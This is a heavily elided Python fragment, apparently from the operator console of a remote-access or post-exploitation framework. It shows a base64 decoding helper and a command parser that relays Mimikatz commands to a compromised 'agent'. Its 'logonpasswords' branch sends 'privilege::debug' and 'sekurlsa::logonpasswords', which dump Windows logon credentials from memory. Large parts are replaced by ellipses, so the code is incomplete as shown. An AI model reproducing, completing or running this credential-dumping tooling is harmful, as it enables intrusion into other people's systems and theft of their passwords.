...
def decode_base64_to_utf8(data):
    try:
        ...
        # If there's an error, return the data, its probably alr decoded
        return data
...
def parseInput(inputstr):
    if inputstr == "quit" or inputstr == "back" or inputstr == "exit":
        ...
        ##
            ...
            mimikatz_cmd = mimikatz_cmd
            agent_send_mimikatz_cmd(mimikatz_cmd)
        elif inputstr == "logonpasswords":
            mimikatz_cmd1 = "privilege::debug"
            mimikatz_cmd2 = "sekurlsa::logonpasswords"
            agent_send_mimikatz_cmd(mimikatz_cmd1)
            agent_send_mimikatz_cmd(mimikatz_cmd2)
